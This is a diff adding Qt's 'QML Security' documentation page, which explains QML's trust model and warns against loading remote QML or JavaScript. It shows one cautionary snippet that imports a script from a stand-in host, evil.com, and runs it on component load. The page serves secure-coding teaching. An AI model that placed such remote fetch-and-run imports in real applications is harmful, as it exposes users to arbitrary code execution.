@@ -1,0 +1,80 @@
+/****************************************************************************
+**
+** Copyright (C) 2012 Nokia Corporation and/or its subsidiary(-ies).
+** All rights reserved.
+** Contact: Nokia Corporation (qt-info@nokia.com)
+**
+** This file is part of the documentation of the Qt Toolkit.
+**
+** $QT_BEGIN_LICENSE:FDL$
+** GNU Free Documentation License
+** Alternatively, this file may be used under the terms of the GNU Free
+** Documentation License version 1.3 as published by the Free Software
+** Foundation and appearing in the file included in the packaging of
+** this file.
+**
+** Other Usage
+** Alternatively, this file may be used in accordance with the terms
+** and conditions contained in a signed written agreement between you
+** and Nokia.
+**
+**
+**
+**
+** $QT_END_LICENSE$
+**
+****************************************************************************/
+
+/*!
+\page qdeclarativesecurity.html
+\title QML Security
+\section1 QML Security
+
+The QML security model is that QML content is a chain of trusted content: the user
+installs QML content that they trust in the same way as they install native Qt applications,
+or programs written with runtimes such as Python and Perl. That trust is establish by any
+of a number of mechanisms, including the availability of package signing on some platforms.
+
+In order to preserve the trust of users, developers producing QML content should not execute
+arbitrary downloaded JavaScript, nor instantiate arbitrary downloaded QML elements.
+
+For example, this QML content:
+
+\qml
+import QtQuick 1.0
+import "http://evil.com/evil.js" as Evil
+
+Component {
+    onLoaded: Evil.doEvil()
+}
+\endqml
+
+is equivalent to downloading "http://evil.com/evil.exe" and running it. The JavaScript execution
+environment of QML does not try to stop any particular accesses, including local file system
+access, just as for any native Qt application, so the "doEvil" function could do the same things
+as a native Qt application, a Python application, a Perl script, etc.
+
+As with any application accessing other content beyond it's control, a QML application should
+perform appropriate checks on untrusted data it loads.
+
+A non-exhaustive list of the ways you could shoot yourself in the foot is:
+
+\list
+    \i Using \c import to import QML or JavaScript you do not control. BAD
+    \i Using \l Loader to import QML you do not control. BAD
+    \i Using \l{XMLHttpRequest}{XMLHttpRequest} to load data you do not control and executing it. BAD
+\endlist
+
+However, the above does not mean that you have no use for the network transparency of QML.
+There are many good and useful things you \e can do:
+
+\list
+    \i Create \l Image elements with source URLs of any online images. GOOD
+    \i Use XmlListModel to present online content. GOOD
+    \i Use \l{XMLHttpRequest}{XMLHttpRequest} to interact with online services. GOOD
+\endlist
+
+The only reason this page is necessary at all is that JavaScript, when run in a \e{web browser},
+has quite many restrictions. With QML, you should neither rely on similar restrictions, nor
+worry about working around them.
+*/
